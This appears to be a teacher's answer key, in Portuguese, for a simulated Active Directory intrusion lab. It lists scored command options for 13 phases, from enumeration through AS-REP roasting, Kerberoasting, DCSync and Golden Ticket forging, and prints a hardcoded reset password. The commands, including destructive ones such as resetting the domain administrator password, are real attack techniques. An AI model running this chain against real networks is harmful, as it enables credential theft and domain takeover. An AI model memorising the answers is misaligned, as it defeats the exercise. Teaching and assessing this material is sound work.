# Gabarito do professor — Ground Station Compromise

Arquivo de referência para correção. Contém, fase a fase, o comando esperado, as 5 opções com classificação (correta / caminho alternativo / incorreta), o impacto em pontuação / detecção / orçamento, a justificativa esperada e a pergunta interpretativa (quando houver).

**Acesso de emergência:** botão "⚙ reset (uso do professor)" na tela inicial pede a senha:

```
Pf2272@2026
```

A senha está em `src/app/api/admin/reset/route.ts` na constante `PROFESSOR_PASSWORD`.

**Seed = RM:** todo o cenário (nomes de domínio, usuários, hashes, flags, **ordem das opções**) é determinístico a partir do RM. Reproduza qualquer tentativa lendo o RM no cabeçalho do relatório do aluno e iniciando uma nova missão com o mesmo RM.

**Pontuação:** soma dos `scoreDelta` é normalizada para 0–10 com `rawScoreMax = 18`. Bônus stealth +0.5 se detecção final <20; penalidade –1.0 se orçamento estourar.

**Legenda de opções:**
- ✅ **correta** — opção esperada da fase
- 🟡 **caminho alternativo** — funciona, avança a missão, normalmente com pontuação menor ou detecção maior
- ❌ **incorreta** — pega armadilha, penalidade

**⚠️ Ordem das opções é embaralhada por seed.** As tabelas abaixo mostram a ordem **canônica do código fonte** (IDs `a`–`e`). Em tela, o aluno vê A–E numa **ordem aleatória determinística** baseada no RM — então a opção correta NÃO é sempre A para todo aluno. O texto completo da opção escolhida fica no relatório, e o log interno também registra o pareamento (ex.: `exibida como C (gabarito A)`). Para reproduzir exatamente o que um aluno viu, inicie uma missão com o mesmo RM — a permutação será idêntica.

**Dicas no enunciado:** apenas as fases 1 (whoami) e 7 (hashcat) trazem o comando esperado explícito no contexto, porque são pré-requisitos genuínos para o aluno se orientar. As demais fases removeram a "cola" e exigem que o aluno conheça a técnica ou consulte `help` no terminal para listar os comandos conhecidos.

---

## Fase 1 — Initial Access Context
**Tema:** Briefing operacional na estação terrestre
**Objetivo:** Validar contexto do token (usuário, grupos, privilégios) antes de qualquer outra técnica.
**Comando esperado:** `whoami`

| ID | Opção | Class | Δ Score | Δ Detect | Δ Budget |
|---|---|---|---|---|---|
| A | `whoami /all` | ✅ correta | +1.0 | +1 | -2 |
| B | `whoami /priv` | 🟡 alt | +0.3 | +1 | -2 |
| C | `whoami /user` | ❌ | -0.2 | +1 | -2 |
| D | `whoami /logonid` | ❌ | -0.2 | +1 | -2 |
| E | `whoami /groups /fo csv > C:\Users\Public\groups.csv` | ❌ (gera artefato em diretório público) | -0.4 | +8 | -3 |

**Evidência liberada (A):** "Identidade inicial validada" com username + grupos.
**Sem justificativa, sem pergunta interpretativa.**

---

## Fase 2 — Domain Enumeration
**Tema:** Mapeamento do segmento solo (IAM Core)
**Objetivo:** Identificar o DC do segmento solo — pré-requisito Kerberos.
**Comando esperado:** `nltest`

| ID | Opção | Class | Δ Score | Δ Detect | Δ Budget |
|---|---|---|---|---|---|
| A | `nltest /dclist:<domínio>` | ✅ | +1.2 | +2 | -3 |
| B | `nltest /domain_trusts` | 🟡 (não cumpre o objetivo) | +0.3 | +2 | -3 |
| C | `nltest /dsgetdc:NONEXISTENT-DOMAIN` | ❌ | -0.4 | +6 | -3 |
| D | `nltest /sc_query:127.0.0.1` | ❌ | -0.2 | +2 | -3 |
| E | `nltest /server:0.0.0.0 /list` | ❌ | -0.4 | +6 | -3 |

**Flag liberada (A):** `FLAG{GS-<seed>-ENUM-<hex>}`
**Evidência (A):** "Domain Controller identificado"

---

## Fase 3 — User and Group Discovery
**Tema:** Inventário de pessoas e times da operação
**Objetivo:** Enumerar usuários/grupos do domínio, achando contas com flags interessantes.
**Comando esperado:** `Get-DomainUser` (aceita também `Get-ADUser`)

| ID | Opção | Class | Δ Score | Δ Detect | Δ Budget |
|---|---|---|---|---|---|
| A | `Get-DomainUser -PreauthNotRequired -Properties samaccountname,description` | ✅ | +1.2 | +4 | -4 |
| B | `Get-DomainUser -AdminCount -Properties memberof` | 🟡 | +0.5 | +4 | -4 |
| C | `Get-DomainUser -SPN` | 🟡 | +0.4 | +4 | -4 |
| D | `Get-DomainUser -LDAPFilter '(objectClass=*)' -Properties *` | ❌ | -0.5 | +15 | -6 |
| E | `Get-DomainUser -Identity 'administrator' -Properties unicodePwd` | ❌ | -0.5 | +12 | -5 |

**Flag (A):** `FLAG{GS-<seed>-DISCOVERY-<hex>}`
**Pergunta interpretativa:** "Qual conta da listagem você considera de maior risco neste momento e por quê? Cite a propriedade que sustenta sua avaliação."
**Resposta esperada:** aponta a conta com `DONT_REQ_PREAUTH` como alvo prioritário, citando `userAccountControl` (bit 0x400000) ou `PreauthNotRequired`.

---

## Fase 4 — Service Account Discovery
**Comando esperado:** `Get-ADUser` (aceita também `Get-DomainUser`)

| ID | Opção | Class | Δ Score | Δ Detect | Δ Budget |
|---|---|---|---|---|---|
| A | `Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,Description` | ✅ | +1.3 | +3 | -3 |
| B | `Get-ADUser -Filter 'Name -like "svc*"' -Properties servicePrincipalName` | 🟡 | +0.5 | +3 | -3 |
| C | `Get-ADUser -Filter * -Properties *` | ❌ | -0.5 | +18 | -6 |
| D | `Get-ADUser -Identity 'krbtgt' -Properties memberOf` | ❌ | -0.4 | +12 | -3 |
| E | `Get-ADUser -Filter 'Description -like "*senha*"'` | ❌ | -0.2 | +3 | -3 |

**Flag (A):** `FLAG{GS-<seed>-SVCACCT-<hex>}`

---

## Fase 5 — AS-REP Roasting
**Comando esperado:** `GetNPUsers.py` (aceita também `Rubeus`)

| ID | Opção | Class | Δ Score | Δ Detect | Δ Budget |
|---|---|---|---|---|---|
| A | `GetNPUsers.py <dom>/ -usersfile users.txt -no-pass -format hashcat -dc-ip <DC-IP>` | ✅ | +1.5 | +4 | -6 |
| B | `Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt` | 🟡 | +1.1 | +8 | -5 |
| C | `GetNPUsers.py <dom>/ -all -request -dc-ip <DC-IP>` | ❌ | -0.5 | +20 | -6 |
| D | `GetNPUsers.py <dom>/<user>:<pwd> -dc-ip <DC-IP>` | ❌ | -0.3 | +6 | -5 |
| E | `GetNPUsers.py <dom>/ -usersfile /dev/null -no-pass` | ❌ | -0.3 | +2 | -5 |

**Flag:** `FLAG{GS-<seed>-ASREP-<hex>}`
**🛑 Justificativa obrigatória.** Esperado: menciona `DONT_REQ_PREAUTH`, `-no-pass`, e por que 1 alvo > todos.

---

## Fase 6 — Kerberoasting
**Comando esperado:** `GetUserSPNs.py` (aceita também `Rubeus`)

| ID | Opção | Class | Δ Score | Δ Detect | Δ Budget |
|---|---|---|---|---|---|
| A | `GetUserSPNs.py <dom>/<user>:<pwd> -dc-ip <DC-IP> -request-user <svc> -outputfile tgs.txt` | ✅ | +1.5 | +5 | -6 |
| B | `Rubeus.exe kerberoast /user:<svc> /outfile:tgs.txt /nowrap` | 🟡 | +1.2 | +7 | -5 |
| C | `GetUserSPNs.py <dom>/<user>:<pwd> -request -dc-ip <DC-IP>` | ❌ | -0.4 | +18 | -6 |
| D | `setspn -Q */*` | ❌ | -0.2 | +2 | -3 |
| E | `klist purge && klist` | ❌ | -0.3 | +3 | -2 |

**Flag:** `FLAG{GS-<seed>-KERBROAST-<hex>}`
**Pergunta interpretativa:** sobre evento 4769 e por que 1 alvo > todos.

---

## Fase 7 — Credential Cracking
**Comando esperado:** `hashcat`

| ID | Opção | Class | Δ Score | Δ Detect | Δ Budget |
|---|---|---|---|---|---|
| A | `hashcat -m 13100 -a 0 tgs.txt wordlist.txt -r rules/best64.rule` | ✅ (TGS-REP) | +1.2 | 0 | -4 |
| B | `hashcat -m 18200 -a 0 asrep.txt wordlist.txt` | 🟡 (AS-REP) | +0.7 | 0 | -4 |
| C | `hashcat -m 1000 -a 3 tgs.txt ?a?a?a?a?a?a?a` | ❌ | -0.4 | 0 | -8 |
| D | `john --format=krb5tgs tgs.txt --wordlist=wordlist.txt` | ❌ (não segue playbook) | 0.0 | 0 | -3 |
| E | `hashcat -m 13100 -a 0 tgs.txt /dev/random` | ❌ | -0.3 | 0 | -3 |

**Flag:** `FLAG{GS-<seed>-CRACK-<hex>}`

---

## Fase 8 — ACL Abuse
**Comando esperado:** `bloodhound-python`

| ID | Opção | Class | Δ Score | Δ Detect | Δ Budget |
|---|---|---|---|---|---|
| A | `bloodhound-python -u <svc> -p '<senha>' -d <dom> -c Default -ns <DC-IP> --zip` | ✅ | +1.4 | +6 | -6 |
| B | `bloodhound-python -u <svc> -p '<senha>' -d <dom> -c All -ns <DC-IP>` | 🟡 (muito ruidoso) | +0.7 | +12 | -6 |
| C | `net group 'Domain Admins' <user> /add /domain` | ❌ | -0.6 | +20 | -5 |
| D | `Get-Acl 'AD:CN=Tier0-MissionOps,...' \| Format-List` | 🟡 | +0.4 | +3 | -4 |
| E | `Set-DomainObject Tier0-MissionOps -Set @{description='owned'}` | ❌ | -0.7 | +25 | -8 |

**Flag:** `FLAG{GS-<seed>-ACL-<hex>}`
**🛑 Justificativa obrigatória.** Esperado: justifica -c Default e como GenericWrite no grupo permite chain até Domain Admins.

---

## Fase 9 — Delegation Abuse
**Comando esperado:** `Get-DomainComputer`

| ID | Opção | Class | Δ Score | Δ Detect | Δ Budget |
|---|---|---|---|---|---|
| A | `Get-DomainComputer -TrustedToAuth -Properties msds-allowedtodelegateto` | ✅ | +1.4 | +5 | -6 |
| B | `Get-DomainComputer -Unconstrained` | 🟡 | +0.6 | +9 | -6 |
| C | `Get-ADComputer -Filter * -Properties ms-DS-MachineAccountQuota` | ❌ | -0.2 | +3 | -3 |
| D | `Get-DomainComputer -Identity '*' -Properties *` | ❌ | -0.5 | +15 | -5 |
| E | `klist purge` | ❌ | -0.3 | +1 | -1 |

**Flag:** `FLAG{GS-<seed>-DELEG-<hex>}`

---

## Fase 10 — Lateral Movement
**Comando esperado:** `wmiexec.py` (aceita também `psexec.py`)

| ID | Opção | Class | Δ Score | Δ Detect | Δ Budget |
|---|---|---|---|---|---|
| A | `wmiexec.py -k -no-pass <dom>/administrator@<host>.<dom>` | ✅ | +1.4 | +8 | -7 |
| B | `psexec.py -k -no-pass <dom>/administrator@<host>.<dom>` | 🟡 (EID 7045) | +0.8 | +18 | -7 |
| C | `Enter-PSSession -ComputerName <host>.<dom> -Authentication Kerberos` | 🟡/❌ | -0.2 | +8 | -3 |
| D | `psexec.py -hashes :000...0 <dom>/administrator@<DC>` | ❌ | -0.6 | +25 | -6 |
| E | `wmiexec.py <dom>/<user>:<pwd>@127.0.0.1` | ❌ | -0.3 | +3 | -3 |

**Flag:** `FLAG{GS-<seed>-LATERAL-<hex>}`
**Pergunta interpretativa:** EIDs do wmiexec vs psexec; aluno deve preferir wmiexec citando 5857/5858 vs 7045/7036.

---

## Fase 11 — DCSync
**Comando esperado:** `secretsdump.py`

| ID | Opção | Class | Δ Score | Δ Detect | Δ Budget |
|---|---|---|---|---|---|
| A | `secretsdump.py <dom>/<iam>:<senha>@<dc>.<dom> -just-dc-user krbtgt -outputfile krbtgt.txt` | ✅ | +1.6 | +12 | -8 |
| B | `secretsdump.py <dom>/<iam>:<senha>@<dc>.<dom>` | 🟡 (dump completo) | +0.4 | +25 | -10 |
| C | `secretsdump.py -system SYSTEM -ntds NTDS.dit LOCAL` | ❌ | -0.3 | +2 | -3 |
| D | `mimikatz lsadump::dcsync /domain:<dom> /user:krbtgt` | 🟡 | +0.8 | +18 | -7 |
| E | `secretsdump.py <dom>/<user-low>:<senha>@<dc>.<dom> -just-dc-user krbtgt` | ❌ | -0.6 | +12 | -6 |

**Flag:** `FLAG{GS-<seed>-DCSYNC-<hex>}`
**🛑 Justificativa obrigatória.** Esperado: cita `Replicating Directory Changes (All)`, por que `-just-dc-user` reduz 4662s, papel do krbtgt para Golden Ticket.

---

## Fase 12 — Golden Ticket
**Comando esperado:** `ticketer.py`

| ID | Opção | Class | Δ Score | Δ Detect | Δ Budget |
|---|---|---|---|---|---|
| A | `ticketer.py -nthash <krbtgt> -domain-sid <SID> -domain <dom> -duration 10 administrator` | ✅ (10h) | +1.5 | +4 | -6 |
| B | `ticketer.py ... -duration 87600 administrator` | ❌ (10 anos) | -0.4 | +22 | -6 |
| C | `mimikatz kerberos::golden /user:Administrator ... /ptt` | 🟡 | +0.9 | +14 | -5 |
| D | `ticketer.py ... guest` | ❌ | -0.3 | +4 | -4 |
| E | `ticketer.py -nthash <wrong-hash> ... administrator` | ❌ | -0.5 | +6 | -4 |

**Flag:** `FLAG{GS-<seed>-GOLDEN-<hex>}`
**🛑 Justificativa obrigatória.** Esperado: lifetime curto (≤24h), papel do SID no PAC, persistência sobrevive reset exceto duplo reset de krbtgt.

---

## Fase 13 — Mission Impact Assessment
**Comando esperado:** `psexec.py` (aceita também `wmiexec.py`)

| ID | Opção | Class | Δ Score | Δ Detect | Δ Budget |
|---|---|---|---|---|---|
| A | `psexec.py -k -no-pass <dom>/administrator@<dc>.<dom>` | ✅ | +1.6 | +10 | -8 |
| B | `wmiexec.py -k -no-pass <dom>/administrator@<dc>.<dom>` | 🟡 (premiada por stealth) | +1.7 | +6 | -7 |
| C | `shutdown /r /m \\<dc> /t 0` | ❌ (fora de escopo) | -2.0 | +30 | -10 |
| D | `net user administrator P@ssw0rd123! /domain` | ❌ (destrutivo) | -2.0 | +28 | -10 |
| E | `Get-ADUser administrator -Properties pwdLastSet` | ❌ (não demonstra impacto) | -0.3 | +2 | -3 |

**Flag:** `FLAG{GS-<seed>-IMPACT-<hex>}`
**Pergunta interpretativa:** 3 sistemas com maior impacto sobre a missão orbital. Resposta esperada combina tlm-ingest (perda de visibilidade), mp-planner (alteração de janelas), fd-orbit (efemérides) e/ou eo-archive (corrupção de produtos).

---

## Critérios sugeridos de correção

| Nota | Critério |
|---|---|
| 9–10 | Concluiu as 13 fases, ≥10 acertos no caminho ✅ ideal, justificativas com vocabulário técnico (eventos EID, atributos LDAP, direitos AD), detecção final ≤ 30. |
| 7–8.9 | Concluiu ≥11 fases, mix de ✅ e 🟡, justificativas corretas mas genéricas, detecção entre 30–60. |
| 5–6.9 | Chegou até DCSync (fase 11), justificativas presentes mas superficiais, ou detecção >60. |
| 3–4.9 | Chegou até fase 6–8, muitos ❌, justificativas vazias ou ausentes. |
| 0–2.9 | Não passou da fase 5, ou abandonou cedo. |

O `professorSummary` no relatório já condensa esses dados (status, score normalizado, fase máxima, detecção, orçamento, técnicas demonstradas/não-demonstradas) — leia-o primeiro.

---

## Reproduzir a tentativa de um aluno

1. No relatório recebido, leia o campo **Seed (RM)** no cover.
2. Na tela inicial deste laboratório, informe um nome qualquer e o **mesmo RM**.
3. O cenário (usuários, hashes, flags, hash krbtgt, **e a ordem das opções em cada modal**) será idêntico ao da tentativa original — basta seguir o texto das opções no relatório para reconstruir o caminho do aluno.
